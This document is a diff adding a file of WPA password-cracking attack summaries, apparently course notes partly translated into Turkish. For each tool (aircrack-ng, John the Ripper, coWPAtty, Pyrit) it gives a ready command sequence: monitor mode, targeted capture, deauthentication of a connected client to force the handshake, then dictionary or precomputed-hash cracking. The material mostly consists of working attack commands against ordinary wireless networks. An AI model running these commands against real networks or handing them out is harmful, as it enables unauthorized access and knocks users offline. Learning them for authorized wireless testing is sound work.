@@ -1,0 +1,118 @@
+### 11.5 Cracking WPA Attack Summary ###
+
+Kablosuz kartınızı AP'nin kanal numarası üzerinde izleme moduna yerleştirerek başlayın:
+
+# airmon-ng start <interface> <AP channel>
+
+
+AP kanalını ve BSSID'yi filtreleyerek, yakalamayı diske kaydederek bir Airodump yakalama başlatın:
+
+# airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
+
+
+Deauthenticate a connected client to force it to complete the 4-way handshake:
+
+# aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
+
+
+Aircrack-ng ile WPA şifresini kırın:
+
+# aircrack-ng -w <wordlist> <capture>
+
+
+Alternatively, if you have and Airolib-ng database, it can be passed to Aircrack:
+
+# aircrack-ng -r <db name> <capture>
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+12.5 Aircrack-ng and JTR Attack Summary 
+
+Kablosuz kartınızı AP'nin kanal numarasında monitör moduna yerleştirin:
+
+# airmon-ng start <interface> <AP channel>
+
+
+AP kanalını ve BSSID'yi filtreleyerek, yakalamayı diske kaydederek bir Airodump yakalama başlatın:
+
+# airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
+
+
+Bir istemciyi kendisine karşı bir kimlik doğrulama saldırısı çalıştırarak 4 yönlü anlaşmayı yeniden bağlanmaya ve tamamlamaya zorlayın:
+
+# aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
+
+
+Bir el sıkışma yakalandıktan sonra, WPA şifresini almak için John the Ripper dizinine geçin ve karıştırılmış sözcükleri Aircrack-ng'ye aktarın:
+
+# ./john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <ESSID> -w - <capture>
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+13.5 coWPAtty Attack Summary 
+
+Kablosuz kartınızı AP'nin kanal numarasında monitör moduna yerleştirin:
+
+# airmon-ng start <interface> <AP channel>
+
+AP kanalını ve BSSID'yi filtreleyerek, dosyayı diske kaydederek bir Airodump yakalama başlatın:
+
+# airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
+
+4 yönlü anlaşmayı tamamlamaya zorlamak için bağlı bir istemcinin kimlik doğrulamasını kaldırın:
+
+# aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
+
+Kelime listesi modunda coWPAtty ile WPA şifresini kırmak için:
+
+# cowpatty -r <capture> -f <wordlist> -2 -s <ESSID>
+
+Gökkuşağı tablosu modunu coWPAtty ile kullanmak için önce karmaları oluşturun:
+
+# genpmk -f <wordlist> -d <hashes filename> -s <ESSID>
+
+WPA şifresini kurtarmak için oluşturulan karmalarla coWPAtty'yi çalıştırın:
+
+# cowpatty -r <capture> -d <hashes filename> -2 -s <ESSID>
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+14.5 Pyrit Attack Summary 
+
+Kablosuz kartınızı AP'nin kanal numarasında monitör moduna yerleştirin:
+
+# airmon-ng start <interface> <AP channel>
+
+Yakalamayı bir dosyaya kaydederek monitör modu arayüzünde koklamak için Pyrit'i kullanın:
+
+# pyrit -r <interface> -o <capture> stripLive
+
+4 yönlü anlaşmayı tamamlamaya zorlamak için bağlı bir istemcinin kimlik doğrulamasını kaldırın:
+
+# aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
+
+WPA şifresini kırmak için Pyrit'i sözlük modunda çalıştırın:
+
+# pyrit -r <capture> -i <wordlist> -b <AP MAC> attack_passthrough
+
+Pyrit'i veritabanı modunda kullanmak için kelime listenizi içe aktararak başlayın:
+
+# pyrit -i <wordlist> import_passwords
+
+Pyrit veri tabanına erişim noktasının ESSID'sini ekleyin:
+
+# pyrit -e <ESSID> create_essid
+
+ESSID için PMK'ları oluşturun:
+
+# pyrit batch
+
+WPA şifresini kırmak için Pyrit'i veritabanı modunda başlatın:
+
+# pyrit -r <capture> -b <AP MAC> attack_db
+
+
+
